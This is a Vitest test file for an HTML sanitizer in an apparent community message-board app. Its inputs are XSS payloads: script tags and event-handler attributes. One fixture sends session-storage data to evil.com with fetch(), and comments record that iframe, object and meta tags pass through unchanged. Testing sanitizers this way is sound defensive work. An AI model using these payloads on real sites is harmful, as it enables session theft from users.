import { describe, it, expect } from 'vitest'
import { sanitizeHtml } from '../sanitizeHtml'

describe('sanitizeHtml', () => {
  describe('XSS prevention - script tags', () => {
    it('should remove simple script tags', () => {
      const input = '<script>alert("xss")</script>'
      expect(sanitizeHtml(input)).toBe('')
    })

    it('should remove script tags with attributes', () => {
      const input = '<script src="malicious.js"></script>'
      expect(sanitizeHtml(input)).toBe('')
    })

    it('should remove script tags with mixed case', () => {
      const input = '<ScRiPt>alert("xss")</ScRiPt>'
      expect(sanitizeHtml(input)).toBe('')
    })

    it('should remove multiple script tags', () => {
      const input = '<script>alert(1)</script><p>Text</p><script>alert(2)</script>'
      expect(sanitizeHtml(input)).toBe('<p>Text</p>')
    })

    it('should remove script tags with newlines', () => {
      const input = `<script>
        alert("xss")
      </script>`
      expect(sanitizeHtml(input)).toBe('')
    })

    it('should remove inline scripts in content', () => {
      const input = 'Hello <script>alert("xss")</script> World'
      expect(sanitizeHtml(input)).toBe('Hello  World')
    })
  })

  describe('XSS prevention - event handlers', () => {
    it('should remove onclick with double quotes', () => {
      const input = '<a onclick="alert(\'xss\')">Click</a>'
      expect(sanitizeHtml(input)).toBe('<a>Click</a>')
    })

    it('should remove onclick with single quotes', () => {
      const input = "<a onclick='alert(\"xss\")'>Click</a>"
      expect(sanitizeHtml(input)).toBe('<a>Click</a>')
    })

    it('should remove onerror events', () => {
      const input = '<img onerror="alert(\'xss\')" src="invalid.jpg">'
      expect(sanitizeHtml(input)).toBe('<img src="invalid.jpg">')
    })

    it('should remove onload events', () => {
      const input = '<body onload="alert(\'xss\')">Content</body>'
      const result = sanitizeHtml(input)
      expect(result).not.toContain('onload')
    })

    it('should remove onmouseover events', () => {
      const input = '<div onmouseover="alert(\'xss\')">Hover</div>'
      expect(sanitizeHtml(input)).toBe('<div>Hover</div>')
    })

    it('should remove multiple event handlers from same element', () => {
      const input = '<a onclick="alert(1)" onmouseover="alert(2)">Link</a>'
      const result = sanitizeHtml(input)
      expect(result).not.toContain('onclick')
      expect(result).not.toContain('onmouseover')
    })

    it('should remove event handlers with mixed case', () => {
      const input = '<div onClick="alert(\'xss\')">Click</div>'
      expect(sanitizeHtml(input)).toBe('<div>Click</div>')
    })
  })

  describe('allowed tags - preserved', () => {
    it('should preserve paragraph tags', () => {
      const input = '<p>This is a paragraph</p>'
      expect(sanitizeHtml(input)).toBe('<p>This is a paragraph</p>')
    })

    it('should preserve br tags', () => {
      const input = 'Line 1<br>Line 2'
      expect(sanitizeHtml(input)).toBe('Line 1<br>Line 2')
    })

    it('should preserve strong tags', () => {
      const input = '<strong>Bold text</strong>'
      expect(sanitizeHtml(input)).toBe('<strong>Bold text</strong>')
    })

    it('should preserve em tags', () => {
      const input = '<em>Italic text</em>'
      expect(sanitizeHtml(input)).toBe('<em>Italic text</em>')
    })

    it('should preserve b tags', () => {
      const input = '<b>Bold</b>'
      expect(sanitizeHtml(input)).toBe('<b>Bold</b>')
    })

    it('should preserve i tags', () => {
      const input = '<i>Italic</i>'
      expect(sanitizeHtml(input)).toBe('<i>Italic</i>')
    })

    it('should preserve u tags', () => {
      const input = '<u>Underlined</u>'
      expect(sanitizeHtml(input)).toBe('<u>Underlined</u>')
    })

    it('should preserve heading tags (h1-h6)', () => {
      expect(sanitizeHtml('<h1>Heading 1</h1>')).toBe('<h1>Heading 1</h1>')
      expect(sanitizeHtml('<h2>Heading 2</h2>')).toBe('<h2>Heading 2</h2>')
      expect(sanitizeHtml('<h3>Heading 3</h3>')).toBe('<h3>Heading 3</h3>')
      expect(sanitizeHtml('<h6>Heading 6</h6>')).toBe('<h6>Heading 6</h6>')
    })

    it('should preserve list tags', () => {
      const input = '<ul><li>Item 1</li><li>Item 2</li></ul>'
      expect(sanitizeHtml(input)).toBe('<ul><li>Item 1</li><li>Item 2</li></ul>')
    })

    it('should preserve anchor tags', () => {
      const input = '<a href="https://example.com">Link</a>'
      expect(sanitizeHtml(input)).toBe('<a href="https://example.com">Link</a>')
    })

    it('should preserve div and span tags', () => {
      const input = '<div><span>Text</span></div>'
      expect(sanitizeHtml(input)).toBe('<div><span>Text</span></div>')
    })
  })

  describe('disallowed tags - left as-is', () => {
    // Note: The current implementation only removes script tags and event handlers
    // Other potentially dangerous tags are left in the HTML
    // This is a known limitation of the simple regex-based approach

    it('should leave iframe tags as-is', () => {
      const input = '<iframe src="malicious.html"></iframe>'
      // Current implementation doesn't escape iframe
      expect(sanitizeHtml(input)).toBe(input)
    })

    it('should leave object tags as-is', () => {
      const input = '<object data="malicious.swf"></object>'
      expect(sanitizeHtml(input)).toBe(input)
    })

    it('should leave embed tags as-is', () => {
      const input = '<embed src="malicious.swf">'
      expect(sanitizeHtml(input)).toBe(input)
    })

    it('should escape style tags (not in allowed list)', () => {
      const input = '<style>body { display: none; }</style>'
      const result = sanitizeHtml(input)
      // style is not in the allowed list, so it gets escaped
      expect(result).toContain('&lt;style&gt;')
    })

    it('should leave link tags as-is', () => {
      const input = '<link rel="stylesheet" href="malicious.css">'
      expect(sanitizeHtml(input)).toBe(input)
    })

    it('should leave meta tags as-is', () => {
      const input = '<meta http-equiv="refresh" content="0;url=malicious.com">'
      expect(sanitizeHtml(input)).toBe(input)
    })
  })

  describe('nested tags', () => {
    it('should handle nested allowed tags', () => {
      const input = '<div><p><strong>Bold</strong> and <em>italic</em></p></div>'
      expect(sanitizeHtml(input)).toBe('<div><p><strong>Bold</strong> and <em>italic</em></p></div>')
    })

    it('should handle deeply nested allowed tags', () => {
      const input = '<div><ul><li><strong><em>Text</em></strong></li></ul></div>'
      expect(sanitizeHtml(input)).toBe('<div><ul><li><strong><em>Text</em></strong></li></ul></div>')
    })

    it('should escape disallowed tags within allowed tags', () => {
      const input = '<p>Text <script>alert("xss")</script> more text</p>'
      const result = sanitizeHtml(input)
      expect(result).not.toContain('<script')
      expect(result).toContain('<p>')
    })
  })

  describe('edge cases', () => {
    it('should handle empty string', () => {
      expect(sanitizeHtml('')).toBe('')
    })

    it('should handle plain text without tags', () => {
      const input = 'Just plain text'
      expect(sanitizeHtml(input)).toBe('Just plain text')
    })

    it('should handle text with < and > but not as tags', () => {
      const input = '5 < 10 and 15 > 10'
      expect(sanitizeHtml(input)).toBe('5 < 10 and 15 > 10')
    })

    it('should handle malformed tags', () => {
      const input = '<div<p>Text</p></div>'
      // Should handle gracefully without breaking
      const result = sanitizeHtml(input)
      expect(result).toBeDefined()
    })

    it('should handle unclosed tags', () => {
      const input = '<p>Unclosed paragraph'
      expect(sanitizeHtml(input)).toBe('<p>Unclosed paragraph')
    })

    it('should handle self-closing tags', () => {
      const input = '<br />'
      expect(sanitizeHtml(input)).toBe('<br />')
    })

    it('should handle tags with multiple attributes', () => {
      const input = '<a href="https://example.com" target="_blank" rel="noopener">Link</a>'
      expect(sanitizeHtml(input)).toBe('<a href="https://example.com" target="_blank" rel="noopener">Link</a>')
    })

    it('should handle special characters in content', () => {
      const input = '<p>Special chars: &amp; &lt; &gt; &quot;</p>'
      expect(sanitizeHtml(input)).toBe('<p>Special chars: &amp; &lt; &gt; &quot;</p>')
    })
  })

  describe('combined XSS attempts', () => {
    it('should handle script injection in event handler', () => {
      const input = '<a onclick="<script>alert(\'xss\')</script>">Link</a>'
      const result = sanitizeHtml(input)
      expect(result).not.toContain('onclick')
      expect(result).not.toContain('<script')
    })

    it('should handle multiple XSS vectors in one input', () => {
      const input = `
        <script>alert("xss1")</script>
        <div onclick="alert('xss2')">
          <p>Safe content</p>
          <img onerror="alert('xss3')" src="x">
        </div>
      `
      const result = sanitizeHtml(input)
      expect(result).not.toContain('<script')
      expect(result).not.toContain('onclick')
      expect(result).not.toContain('onerror')
      expect(result).toContain('<p>Safe content</p>')
    })

    it('should handle encoded script tags', () => {
      // This is a basic test - actual encoding attacks are more complex
      const input = '<p>Normal text</p><script>alert("xss")</script>'
      const result = sanitizeHtml(input)
      expect(result).toBe('<p>Normal text</p>')
    })
  })

  describe('real-world scenarios', () => {
    it('should allow safe message board post', () => {
      const input = `
        <div>
          <h3>Question about pool booking</h3>
          <p>Hi everyone,</p>
          <p>Does anyone know if the <strong>pool</strong> is open this weekend?</p>
          <ul>
            <li>Saturday</li>
            <li>Sunday</li>
          </ul>
          <p>Thanks!</p>
        </div>
      `
      // Should preserve all content
      const result = sanitizeHtml(input)
      expect(result).toContain('<h3>')
      expect(result).toContain('<strong>')
      expect(result).toContain('<ul>')
      expect(result).not.toContain('<script')
    })

    it('should sanitize malicious message board post', () => {
      const input = `
        <div>
          <p>Check this out</p>
          <script>
            // Steal session storage
            fetch('https://evil.com/steal?data=' + sessionStorage.getItem('owners_secure_access'))
          </script>
          <img onerror="document.location='https://evil.com'" src="x">
        </div>
      `
      const result = sanitizeHtml(input)
      expect(result).not.toContain('<script')
      expect(result).not.toContain('onerror')
      expect(result).toContain('<p>Check this out</p>') // Safe content preserved
    })
  })
})
